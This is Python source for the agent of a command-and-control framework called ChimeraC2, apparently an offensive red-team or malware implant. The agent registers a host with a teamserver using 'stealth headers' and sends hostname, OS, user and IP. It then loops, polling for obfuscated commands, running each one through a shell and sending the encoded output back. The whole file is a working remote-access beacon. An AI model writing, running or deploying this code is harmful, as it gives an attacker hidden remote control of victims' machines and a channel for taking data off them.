import time
import socket
import platform
import subprocess
import requests
from agent.obfuscation import encode_payload, decode_payload, get_stealth_headers

# Configuration
SERVER_URL = "http://127.0.0.1:5000"  # Update with your Teamserver IP if running distributed
AGENT_ID = f"agent-{socket.gethostname()}-{int(time.time())}"

def get_system_info():
    """Gathers basic host information for registration."""
    return {
        "agent_id": AGENT_ID,
        "hostname": socket.gethostname(),
        "os": platform.system() + " " + platform.release(),
        "user": platform.uname().node,
        "ip": socket.gethostbyname(socket.gethostname())
    }

def register_agent():
    """Registers the agent with the Teamserver using stealth headers."""
    url = f"{SERVER_URL}/api/v1/beacon/register"
    headers = get_stealth_headers()
    try:
        response = requests.post(url, json=get_system_info(), headers=headers, timeout=5)
        if response.status_code == 200:
            print(f"[+] Agent registered successfully: {AGENT_ID}")
            return True
    except Exception as e:
        print(f"[-] Registration failed: {e}")
    return False

def poll_tasks():
    """Polls the Teamserver for tasks using stealth headers."""
    url = f"{SERVER_URL}/api/v1/beacon/poll"
    headers = get_stealth_headers()
    payload = {"agent_id": AGENT_ID}
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data.get("task_id"), data.get("command")
    except Exception:
        pass
    return None, None

def send_result(task_id, output, exit_code):
    """Encodes output using Base64 and sends the task result back securely."""
    url = f"{SERVER_URL}/api/v1/beacon/result"
    headers = get_stealth_headers()
    
    # Obfuscate output via your module's encode_payload function
    encoded_output = encode_payload(output)
    
    payload = {
        "task_id": task_id,
        "agent_id": AGENT_ID,
        "output": encoded_output,
        "exit_code": exit_code
    }
    
    try:
        requests.post(url, json=payload, headers=headers, timeout=5)
    except Exception as e:
        print(f"[-] Failed to send result: {e}")

def run_agent_loop():
    """Main agent beacon loop."""
    print(f"[*] Starting ChimeraC2 Agent: {AGENT_ID}")
    
    while not register_agent():
        print("[*] Retrying registration in 5 seconds...")
        time.sleep(5)
        
    print("[+] Entering beacon loop...")
    while True:
        task_id, encoded_command = poll_tasks()
        
        if task_id and encoded_command:
            # Decode the command using your obfuscation module
            command = decode_payload(encoded_command)
            print(f"[*] Received task [{task_id}]: {command}")
            
            # Execute command locally
            try:
                result = subprocess.run(
                    command, 
                    shell=True, 
                    capture_output=True, 
                    text=True, 
                    timeout=30
                )
                output = result.stdout + result.stderr
                exit_code = result.returncode
            except Exception as e:
                output = str(e)
                exit_code = 1
                
            # Send encoded result back
            send_result(task_id, output, exit_code)
            print(f"[+] Task {task_id} completed and results obfuscated/sent.")
            
        time.sleep(5)  # Beacon interval

if __name__ == "__main__":
    run_agent_loop()